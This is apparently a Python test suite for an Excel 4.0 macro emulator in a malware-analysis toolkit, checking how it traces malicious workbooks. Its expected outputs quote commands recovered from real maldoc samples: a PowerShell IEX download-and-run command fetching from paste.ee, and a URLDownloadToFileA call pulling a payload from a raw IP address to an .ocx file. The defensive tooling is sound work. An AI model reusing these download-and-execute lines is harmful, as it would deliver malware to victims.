from __future__ import annotations

from refinery.lib.excel import synthesize_formula
from refinery.lib.excel.formula.model import XlNumber
from refinery.lib.scripts.xlm import XlmCursor, XlmEngine, XlmReference, XlmView
from refinery.lib.scripts.xlm.names import XlmNameEntry
from refinery.lib.scripts.xlm.trace import XlmSeverity, XlmStatus
from test import TestBase
from test.lib.excel.samples import (
    XLM_MACRO_ASSIGN_BIFF8,
    XLM_MACRO_FORMULA_XLSM,
    XLM_MACRO_NAMES_BIFF8,
    XLM_MACRO_RPN_BIFF8,
    XLM_MACRO_TEXT_XLSM,
)
from test.lib.scripts.xlm.modify import replace_cell_formula

_MALDOC = 'dc44bbfc845fc078cf38b9a3543a32ae1742be8c6320b81cf6cd5a8cee3c696a'


def _macrosheet(view: XlmView, name: str):
    sheet = view.macrosheet(name)
    assert sheet is not None
    return sheet


def _run(*replacements: tuple[str, str], **options):
    data = XLM_MACRO_TEXT_XLSM
    for cell, formula in replacements:
        data = replace_cell_formula(data, cell, formula)
    engine = XlmEngine(XlmView(data), **options)
    return list(engine.run()), engine


def _steps(*replacements: tuple[str, str], **options) -> list:
    return _run(*replacements, **options)[0]


class TestXlmEngineEntries(TestBase):

    _ANCHORS = [
        (XLM_MACRO_RPN_BIFF8, 'mP9mScF1m5', 41, 19),
        (XLM_MACRO_NAMES_BIFF8, 'Acf444', 9591, 1),
        (XLM_MACRO_ASSIGN_BIFF8, 'sod', 25268, 148),
        (XLM_MACRO_TEXT_XLSM, 'Doc1', 109, 52),
        (XLM_MACRO_FORMULA_XLSM, 'PCWV', 8, 7),
    ]

    def test_every_run_starts_at_the_fall_through_anchor_of_its_entry_name(self):
        for data, sheet, row, col in self._ANCHORS:
            with self.subTest(sheet=sheet):
                steps = list(XlmEngine(XlmView(data)).run())
                self.assertNotEqual(steps, [])
                self.assertEqual(
                    (steps[0].sheet, steps[0].row, steps[0].col),
                    (sheet, row, col),
                )

    def test_the_run_of_the_maldoc_starts_at_its_program(self):
        steps = list(XlmEngine(XlmView(self.download_sample(_MALDOC))).run())
        self.assertEqual(
            (steps[0].sheet, steps[0].row, steps[0].col, steps[0].text),
            ('Tiposa', 25, 7, 'GOTO(Vtreytr!F17)'),
        )


class TestXlmEngineTraces(TestBase):

    def test_the_names_sample_answers_one_partial_step(self):
        steps = list(XlmEngine(XlmView(XLM_MACRO_NAMES_BIFF8)).run())
        self.assertEqual(len(steps), 1)
        self.assertEqual(steps[0].status, XlmStatus.PartialEvaluation)
        self.assertEqual(
            steps[0].text,
            '=EXEC("powershell -Command IEX (new`-OB`jeCT(\'Net.WebClient\')).'
            '\'DoWnloAdsTrInG\'(\'ht\'+\'tp://paste.ee/r/pLpR9\')")',
        )

    def test_the_rpn_sample_walks_its_column_one_row_at_a_time(self):
        steps = list(XlmEngine(XlmView(XLM_MACRO_RPN_BIFF8)).run())
        self.assertEqual([(step.sheet, step.row, step.col) for step in steps], [
            ('mP9mScF1m5', row, 19) for row in range(41, 52)
        ] + [
            ('mP9mScF1m5', row, 20) for row in (1, 3, 4, 5, 6, 7, 8, 9, 10)
        ])
        self.assertEqual(
            [step.status for step in steps],
            [XlmStatus.FullEvaluation] * 9
            + [XlmStatus.PartialEvaluation, XlmStatus.FullEvaluation]
            + [XlmStatus.FullEvaluation] * 6
            + [XlmStatus.PartialEvaluation, XlmStatus.FullEvaluation]
            + [XlmStatus.End],
        )
        self.assertEqual(steps[10].severity, XlmSeverity.JUMP)
        self.assertEqual(steps[10].text, 'GOTO(T1)')
        self.assertEqual(steps[-1].text, 'CLOSE(FALSE)')

    def test_the_rpn_sample_executes_the_formulas_its_own_column_writes(self):
        # the ten writes the sample performs install executable trees, so the run does not end
        # at the jump target but walks the written column until the CLOSE it wrote there
        steps = list(XlmEngine(XlmView(XLM_MACRO_RPN_BIFF8)).run())
        self.assertEqual(steps[11].row, 1)
        self.assertEqual(steps[11].text, 'IF(GET.WORKSPACE(13)<770,CLOSE(FALSE),)')
        self.assertEqual(steps[17].text, '=ALERT('
            '"The workbook cannot be opened or repaired by Microsoft Excel because it\'s '
            'corrupt.",2)')

    def test_the_assign_sample_enters_through_a_cell_call(self):
        steps = list(XlmEngine(XlmView(XLM_MACRO_ASSIGN_BIFF8)).run())
        self.assertNotEqual(steps, [])
        self.assertEqual(
            (steps[0].row, steps[0].col, steps[0].text),
            (25268, 148, '$DQ$42603()'),
        )
        self.assertEqual((steps[1].row, steps[1].col), (42603, 121))
        self.assertEqual(steps[-1].status, XlmStatus.End)
        self.assertEqual(steps[-1].text, 'HALT()')

    def test_the_maldoc_run_ends_at_its_return(self):
        steps = list(XlmEngine(XlmView(self.download_sample(_MALDOC))).run())
        self.assertEqual(
            [step.status for step in steps if step.status is XlmStatus.Error],
            [],
        )
        self.assertEqual(
            (steps[-1].sheet, steps[-1].row, steps[-1].col, steps[-1].text),
            ('Tiposa1', 30, 7, 'RETURN()'),
        )

    def test_the_maldoc_run_spells_the_paths_it_downloads(self):
        steps = list(XlmEngine(XlmView(self.download_sample(_MALDOC))).run())
        self.assertEqual(
            [
                (step.sheet, step.row)
                for step in steps
                if 'Ropedjo1.ocx' in step.text
            ],
            [('Xwtrd', 21), ('Tiposa1', 22)],
        )
        self.assertEqual(
            steps[8].text,
            '=uRlMon.URLDownloadToFileA(0,'
            '"http://94.140.112.209/5783027620089514.dat","C:\\ProgramData\\Ropedjo1.ocx",0,0)',
        )


class TestXlmEngineControl(TestBase):

    def test_a_goto_moves_execution_to_the_address_it_names(self):
        steps = _steps(('AZ110', 'GOTO(AZ118)'))
        self.assertEqual(
            [(step.row, step.col) for step in steps],
            [(109, 52), (110, 52), (118, 52), (120, 52), (121, 52)],
        )
        self.assertEqual(steps[1].severity, XlmSeverity.JUMP)
        self.assertEqual(steps[1].status, XlmStatus.FullEvaluation)

    def test_a_goto_that_jumps_to_itself_terminates_by_loop_detection(self):
        steps = _steps(('AZ110', 'GOTO(AZ110)'))
        self.assertEqual(steps[0].row, 109)
        self.assertEqual(steps[0].status, XlmStatus.FullEvaluation)
        self.assertEqual(steps[0].text, 'SET.VALUE(BD108,"URLMo")')
        self.assertEqual([step.text for step in steps[1:]], ['GOTO(AZ110)'] * 19)
        self.assertEqual(
            [step.status for step in steps[1:]],
            [XlmStatus.FullEvaluation] * 19,
        )

    def test_a_while_whose_condition_does_not_hold_ignores_the_rest_of_the_column(self):
        steps = _steps(('AZ110', 'WHILE(FALSE)'))
        self.assertEqual(
            [(step.row, step.col) for step in steps],
            [
                (109, 52), (110, 52), (112, 52), (113, 52),
                (114, 52), (115, 52), (116, 52), (121, 52),
            ],
        )
        self.assertEqual(steps[1].text, 'WHILE(FALSE)')
        self.assertEqual(steps[1].status, XlmStatus.FullEvaluation)
        self.assertEqual(steps[1].severity, XlmSeverity.IMPORTANT)

    def test_a_for_cell_loop_walks_its_range_until_its_next_falls_through(self):
        steps, engine = _run(
            ('AZ110', 'FOR.CELL("counter",AZ109:AZ112)'),
            ('AZ112', 'NEXT()'),
        )
        self.assertEqual(
            [(step.row, step.col) for step in steps],
            [
                (109, 52),
                (110, 52), (112, 52),
                (110, 52), (112, 52),
                (110, 52), (112, 52),
                (110, 52),
                (113, 52), (114, 52), (115, 52), (116, 52),
                (118, 52), (120, 52), (121, 52),
            ],
        )
        entry = engine.view.names.resolve('counter')
        assert entry is not None and entry.formula is not None
        self.assertEqual(synthesize_formula(entry.formula), 'Doc1!$AZ$112')

    def test_an_unknown_command_spells_the_empty_slot_of_a_missing_argument(self):
        steps = _steps(('AZ110', 'FOO(1,,2)'))
        self.assertEqual(steps[1].status, XlmStatus.PartialEvaluation)
        self.assertEqual(steps[1].text, '=FOO(1,,2)')

    def test_a_partial_condition_branches_into_both_arms_in_turn(self):
        steps = _steps(('AZ110', 'IF(AZ112,1+1,2+2)'))
        self.assertEqual(steps[1].status, XlmStatus.FullBranching)
        self.assertEqual(steps[1].text, 'IF(AZ112,1+1,2+2)')
        self.assertEqual(steps[2].text, '[TRUE] 2')
        self.assertEqual(steps[3].row, 112)
        self.assertEqual(steps[11].text, '[FALSE] 4')
        self.assertEqual(steps[12].row, 112)
        self.assertEqual(steps[-1].row, 121)

    def test_a_false_branch_rolls_back_the_name_its_true_branch_defined(self):
        steps, engine = _run(('AZ110', 'IF(AZ112,SET.NAME("probe",42),1)'))
        self.assertEqual(steps[2].text, '[TRUE] SET.NAME(probe,42)')
        self.assertEqual(engine.view.names.resolve('probe'), None)

    def test_a_run_that_exceeds_its_step_budget_ends_with_an_error_step(self):
        steps = _steps(
            ('AZ110', 'WHILE(TRUE)'),
            ('AZ112', 'NEXT()'),
            max_steps=10,
        )
        self.assertEqual(len(steps), 11)
        self.assertEqual(steps[-1].status, XlmStatus.Error)
        self.assertEqual(steps[-1].text, 'step budget of 10 exhausted')
        self.assertEqual(steps[-2].text, 'WHILE(TRUE) -> [True]')


class TestXlmEngineJournal(TestBase):

    def test_a_cell_the_program_writes_is_visible_to_the_fall_through(self):
        engine = XlmEngine(XlmView(XLM_MACRO_TEXT_XLSM))
        cursor = XlmCursor('Doc1', 116, 52)
        self.assertEqual(
            engine.next_formula_cell(cursor),
            XlmCursor('Doc1', 118, 52),
        )
        position = engine.snapshot()
        engine.write_cell(XlmReference('Doc1', 117, 52), '=HALT()', cursor)
        self.assertEqual(
            engine.next_formula_cell(cursor),
            XlmCursor('Doc1', 117, 52),
        )
        engine.rollback(position)
        self.assertEqual(
            engine.next_formula_cell(cursor),
            XlmCursor('Doc1', 118, 52),
        )

    def test_a_rollback_removes_a_cell_the_rolled_back_writes_created(self):
        view = XlmView(XLM_MACRO_TEXT_XLSM)
        engine = XlmEngine(view)
        position = engine.snapshot()
        engine.write_cell(XlmReference('Doc1', 200, 52), '=1+1', XlmCursor('Doc1', 1, 1))
        created = _macrosheet(view, 'Doc1').cell(200, 52)
        assert created is not None
        self.assertEqual(created.value, '=1+1')
        self.assertEqual(
            engine.read_reference(
                XlmReference('Doc1', 200, 52), XlmCursor('Doc1', 1, 1),
            ).value,
            2,
        )
        engine.rollback(position)
        self.assertEqual(_macrosheet(view, 'Doc1').cell(200, 52), None)
        self.assertEqual(
            engine.read_reference(
                XlmReference('Doc1', 200, 52), XlmCursor('Doc1', 1, 1),
            ).value,
            None,
        )

    def test_a_rollback_restores_the_value_and_formula_of_an_overwritten_cell(self):
        view = XlmView(XLM_MACRO_TEXT_XLSM)
        engine = XlmEngine(view)
        cell = view.cell('Doc1', 109, 52)
        assert cell is not None
        self.assertEqual((cell.value, cell.formula is None), (False, False))
        position = engine.snapshot()
        engine.write_cell(XlmReference('Doc1', 109, 52), 'changed', XlmCursor('Doc1', 1, 1))
        self.assertEqual((cell.value, cell.formula), ('changed', None))
        engine.write_value(cell, 7)
        self.assertEqual(cell.value, 7)
        engine.rollback(position)
        self.assertEqual((cell.value, cell.formula is None), (False, False))

    def test_a_rollback_undoes_a_name_the_rolled_back_run_defined(self):
        view = XlmView(XLM_MACRO_TEXT_XLSM)
        engine = XlmEngine(view)
        position = engine.snapshot()
        engine.define_name(XlmNameEntry(name='probe', sheet=None, formula=XlNumber(value=42)))
        resolved = view.names.resolve('probe')
        assert resolved is not None and resolved.formula is not None
        self.assertEqual(synthesize_formula(resolved.formula), '42')
        engine.rollback(position)
        self.assertEqual(view.names.resolve('probe'), None)

    def test_a_rollback_restores_the_name_a_rolled_back_run_replaced(self):
        view = XlmView(XLM_MACRO_TEXT_XLSM)
        engine = XlmEngine(view)
        entry = view.names.resolve('auto_open')
        assert entry is not None
        position = engine.snapshot()
        engine.define_name(XlmNameEntry(
            name=entry.name,
            sheet=entry.sheet,
            formula=XlNumber(value=42),
        ))
        replaced = view.names.resolve('auto_open')
        assert replaced is not None and replaced.formula is not None
        self.assertEqual(synthesize_formula(replaced.formula), '42')
        engine.rollback(position)
        self.assertEqual(view.names.resolve('auto_open'), entry)

    def test_a_rollback_undoes_an_alias_the_rolled_back_run_registered(self):
        engine = XlmEngine(XlmView(XLM_MACRO_TEXT_XLSM))
        engine.register_alias('old', 'Kernel32.Sleep')
        position = engine.snapshot()
        engine.register_alias('old', 'urlmon.URLDownloadToFileA')
        engine.register_alias('fresh', 'urlmon.URLDownloadToFileA')
        self.assertEqual(engine.aliases, {
            'old': 'urlmon.URLDownloadToFileA',
            'fresh': 'urlmon.URLDownloadToFileA',
        })
        engine.rollback(position)
        self.assertEqual(engine.aliases, {'old': 'Kernel32.Sleep'})

    def test_a_rollback_undoes_the_files_a_run_opened_and_wrote(self):
        engine = XlmEngine(XlmView(XLM_MACRO_TEXT_XLSM))
        position = engine.snapshot()
        engine.open_file(r'C:\Users\Public\note.txt')
        self.assertTrue(engine.write_file(r'C:\Users\Public\note.txt', 'payload'))
        engine.rollback(position)
        self.assertEqual(engine.files.size(r'C:\Users\Public\note.txt'), None)
        self.assertFalse(engine.write_file(r'C:\Users\Public\note.txt', 'payload'))

    def test_a_rollback_undoes_the_memory_a_run_allocated_and_wrote(self):
        engine = XlmEngine(XlmView(XLM_MACRO_TEXT_XLSM))
        position = engine.snapshot()
        base = engine.allocate_memory(4194304, 4096)
        self.assertTrue(engine.write_memory(base, b'\xde\xad\xbe\xef', 4))
        self.assertEqual(engine.memory.peek(base, 4), b'\xde\xad\xbe\xef')
        engine.rollback(position)
        self.assertEqual(engine.memory.peek(base, 4), None)
        self.assertFalse(engine.write_memory(base, b'\xde\xad\xbe\xef', 4))

    def test_a_rollback_undoes_the_failed_write_marks_a_run_made(self):
        engine = XlmEngine(XlmView(XLM_MACRO_TEXT_XLSM))
        first = XlmReference('Doc1', 200, 52)
        second = XlmReference('Doc1', 201, 52)
        engine.mark_failed(first)
        position = engine.snapshot()
        engine.mark_failed(second)
        engine.unmark_failed(first)
        self.assertEqual(engine.failed_writes, {second})
        engine.rollback(position)
        self.assertEqual(engine.failed_writes, {first})
